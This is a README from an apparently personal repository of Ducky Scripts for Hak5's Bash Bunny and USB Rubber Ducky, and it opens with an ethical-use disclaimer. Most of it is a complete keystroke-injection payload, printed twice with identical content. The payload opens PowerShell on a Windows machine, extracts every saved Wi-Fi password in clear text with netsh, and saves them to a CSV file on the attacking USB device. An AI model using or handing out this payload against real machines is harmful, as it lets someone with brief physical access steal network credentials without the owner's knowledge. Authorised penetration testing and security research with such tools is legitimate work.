# Steven's Custom Ducky Script Repository

This repository contains **custom Ducky Scripts** designed for use with **Hak5's Bash Bunny** and **USB Rubber Ducky**. These scripts are intended for **educational purposes, ethical hacking, penetration testing, and cybersecurity research**.



## ⚠ Disclaimer

 **Legal & Ethical Use Notice**  
These scripts are provided **strictly for educational and research purposes only**. Unauthorized use of these scripts to access systems without permission is **illegal and punishable by law**. By using this repository, you **agree** to only use these scripts in **controlled environments** (e.g., on your own devices or with explicit permission). I, the author, **do not take responsibility** for any misuse of these scripts. Thank you!



## payload.txt



## Bash Bunny Network Key Dumper (Windows) 
Payload.txt handles overall attack logic, device modes, and script execution.
```ducky
# set up payload
LED SETUP
GET SWITCH_POSITION
ATTACKMODE HID STORAGE

# run duckysript file 'ducky-script.txt'
LED STAGE1
QUACK ${SWITCH_POSITION}/ducky-script.txt

# end payload
LED FINISH
```

Ducky-script.txt contains keystroke injection commands (Ducky Script syntax).
```ducky
GUI r
DELAY 500
STRING powershell -NoProfile 
ENTER
DELAY 500

STRING $u=gwmi Win32_Volume|?{$_.Label -eq'BashBunny'}|select name;cd $u.name
ENTER
DELAY 500
STRING cd loot
ENTER
DELAY 500

STRING (netsh wlan show profiles) | Select-String ":(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Export-Csv -NoTypeInformation -Path ".\$env:UserName`_WiFiPasswords.csv"; exit
ENTER

```

## Bash Bunny Network Key Dumper (Windows) 
Payload.txt handles overall attack logic, device modes, and script execution.
```ducky
# set up payload
LED SETUP
GET SWITCH_POSITION
ATTACKMODE HID STORAGE

# run duckysript file 'ducky-script.txt'
LED STAGE1
QUACK ${SWITCH_POSITION}/ducky-script.txt

# end payload
LED FINISH
```

Ducky-script.txt contains keystroke injection commands (Ducky Script syntax).
```ducky
GUI r
DELAY 500
STRING powershell -NoProfile 
ENTER
DELAY 500

STRING $u=gwmi Win32_Volume|?{$_.Label -eq'BashBunny'}|select name;cd $u.name
ENTER
DELAY 500
STRING cd loot
ENTER
DELAY 500

STRING (netsh wlan show profiles) | Select-String ":(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Export-Csv -NoTypeInformation -Path ".\$env:UserName`_WiFiPasswords.csv"; exit
ENTER

```




## 🔗 References

- [Hak5 Official Website](https://hak5.org/)
- [USB Rubber Ducky Documentation](https://docs.hak5.org/)
- [Bash Bunny Documentation](https://docs.hak5.org/bash-bunny/)

